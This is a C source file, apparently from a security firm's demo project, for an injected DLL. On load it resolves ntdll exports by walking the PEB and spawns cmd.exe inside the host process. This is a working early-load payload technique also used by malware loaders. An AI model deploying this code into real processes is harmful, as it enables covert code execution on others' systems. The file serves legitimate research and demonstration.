/*
 * Copyright (c) 2022 Hunt & Hackett.
 *
 * This demo project is licensed under the MIT license.
 *
 * Authors:
 *     diversenok
 *
 */

#define PHNT_VERSION PHNT_WIN11
#include <phnt_windows.h>
#include <phnt.h>

#ifdef AUTO_UNLOAD
#define LOAD_RESULT FALSE
#else
#define LOAD_RESULT TRUE
#endif

#define HEADER_FIELD(NtHeaders, Field) (((NtHeaders)->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) \
	? ((PIMAGE_NT_HEADERS64)(NtHeaders))->OptionalHeader.Field \
	: ((PIMAGE_NT_HEADERS32)(NtHeaders))->OptionalHeader.Field)

LONG strcmp2(
    _In_z_ PCSTR Str1,
    _In_z_ PCSTR Str2
)
{
    while (*Str1 && *Str2 && (*Str1 == *Str2))
    {
        Str1++;
        Str2++;
    }
    return (LONG)*Str1 - (LONG)*Str2;
}

ULONG
WINAPI
NtDllMain(
    PVOID hModule,
    ULONG ulReason,
    LPVOID lpReserved
)
{
    if (ulReason != DLL_PROCESS_ATTACH)
        return TRUE;

    // Locate LDR entry for ntdll in PEB
    PLDR_DATA_TABLE_ENTRY hNtdll = CONTAINING_RECORD(
        NtCurrentPeb()->Ldr->InInitializationOrderModuleList.Flink,
        LDR_DATA_TABLE_ENTRY,
        InInitializationOrderLinks
    );

    // Locate and check DOS and NT headers
    PIMAGE_DOS_HEADER dosHeader = hNtdll->DllBase;

    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    PIMAGE_NT_HEADERS ntHeader = RtlOffsetToPointer(dosHeader, dosHeader->e_lfanew);

    if (ntHeader->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    // Locate the export directory
    ULONG exportDirectoryRva;
    PIMAGE_EXPORT_DIRECTORY exportDirectory;
    PUSHORT nameOrdinals;
    PULONG names;
    PULONG functions;

    exportDirectoryRva = HEADER_FIELD(ntHeader, DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]).VirtualAddress;
    exportDirectory = RtlOffsetToPointer(dosHeader, exportDirectoryRva);

    names = RtlOffsetToPointer(dosHeader, exportDirectory->AddressOfNames);
    functions = RtlOffsetToPointer(dosHeader, exportDirectory->AddressOfFunctions);
    nameOrdinals = RtlOffsetToPointer(dosHeader, exportDirectory->AddressOfNameOrdinals);
    
    // Define function prototypes
    NTSTATUS (NTAPI *RtlCreateProcessParametersEx)(
        _Out_ PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
        _In_ PUNICODE_STRING ImagePathName,
        _In_opt_ PUNICODE_STRING DllPath,
        _In_opt_ PUNICODE_STRING CurrentDirectory,
        _In_opt_ PUNICODE_STRING CommandLine,
        _In_opt_ PVOID Environment,
        _In_opt_ PUNICODE_STRING WindowTitle,
        _In_opt_ PUNICODE_STRING DesktopInfo,
        _In_opt_ PUNICODE_STRING ShellInfo,
        _In_opt_ PUNICODE_STRING RuntimeData,
        _In_ ULONG Flags
    ) = NULL;

    NTSTATUS (NTAPI *RtlCreateUserProcess)(
        _In_ PUNICODE_STRING NtImagePathName,
        _In_ ULONG AttributesDeprecated,
        _In_ PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
        _In_opt_ PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
        _In_opt_ PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
        _In_opt_ HANDLE ParentProcess,
        _In_ BOOLEAN InheritHandles,
        _In_opt_ HANDLE DebugPort,
        _In_opt_ HANDLE TokenHandle, // used to be ExceptionPort
        _Out_ PRTL_USER_PROCESS_INFORMATION ProcessInformation
    ) = NULL;

    NTSTATUS (NTAPI *RtlDestroyProcessParameters)(
        _In_ _Post_invalid_ PRTL_USER_PROCESS_PARAMETERS ProcessParameters
    ) = NULL;

    NTSTATUS (NTAPI *NtResumeThread)(
        _In_ HANDLE ThreadHandle,
        _Out_opt_ PULONG PreviousSuspendCount
    ) = NULL;

    NTSTATUS (NTAPI *NtClose)(
        _In_ _Post_ptr_invalid_ HANDLE Handle
    ) = NULL;

    // Find exports
    for (ULONG i = 0; i < exportDirectory->NumberOfNames; i++)
    {
        if (!RtlCreateProcessParametersEx && strcmp2(RtlOffsetToPointer(dosHeader, names[i]), "RtlCreateProcessParametersEx") == 0)
            RtlCreateProcessParametersEx = RtlOffsetToPointer(dosHeader, functions[nameOrdinals[i]]);
        else if (!RtlCreateUserProcess && strcmp2(RtlOffsetToPointer(dosHeader, names[i]), "RtlCreateUserProcess") == 0)
            RtlCreateUserProcess = RtlOffsetToPointer(dosHeader, functions[nameOrdinals[i]]);
        else if (!RtlDestroyProcessParameters && strcmp2(RtlOffsetToPointer(dosHeader, names[i]), "RtlDestroyProcessParameters") == 0)
            RtlDestroyProcessParameters = RtlOffsetToPointer(dosHeader, functions[nameOrdinals[i]]);
        else if (!NtResumeThread && strcmp2(RtlOffsetToPointer(dosHeader, names[i]), "NtResumeThread") == 0)
            NtResumeThread = RtlOffsetToPointer(dosHeader, functions[nameOrdinals[i]]);
        else if (!NtClose && strcmp2(RtlOffsetToPointer(dosHeader, names[i]), "NtClose") == 0)
            NtClose = RtlOffsetToPointer(dosHeader, functions[nameOrdinals[i]]);
    }

    if (
        !RtlCreateProcessParametersEx ||
        !RtlCreateUserProcess ||
        !RtlDestroyProcessParameters ||
        !NtResumeThread ||
        !NtClose
    )
        return FALSE;

    // Execute process creation payload
    NTSTATUS status;
    UNICODE_STRING imageName;
    PRTL_USER_PROCESS_PARAMETERS processParams;
    RTL_USER_PROCESS_INFORMATION processInfo;

    imageName.Buffer = L"\\SystemRoot\\system32\\cmd.exe";
    for (imageName.Length = 0; imageName.Buffer[imageName.Length]; imageName.Length++);
    imageName.Length = imageName.Length * sizeof(WCHAR);
    imageName.MaximumLength = imageName.Length + sizeof(UNICODE_NULL);

    status = RtlCreateProcessParametersEx(
        &processParams,
        &imageName,
        NULL,
        NULL,
        NULL,
        NULL,
        &imageName,
        NULL,
        NULL,
        NULL,
        RTL_USER_PROC_PARAMS_NORMALIZED
    );

    if (!NT_SUCCESS(status))
        return FALSE;

    status = RtlCreateUserProcess(
        &imageName,
        0,
        processParams,
        NULL,
        NULL,
        NtCurrentProcess(),
        TRUE,
        NULL,
        NULL,
        &processInfo
    );

    RtlDestroyProcessParameters(processParams);

    if (!NT_SUCCESS(status))
        return FALSE;

    NtResumeThread(processInfo.ThreadHandle, NULL);
    NtClose(processInfo.ProcessHandle);
    NtClose(processInfo.ThreadHandle);

    return LOAD_RESULT;
}

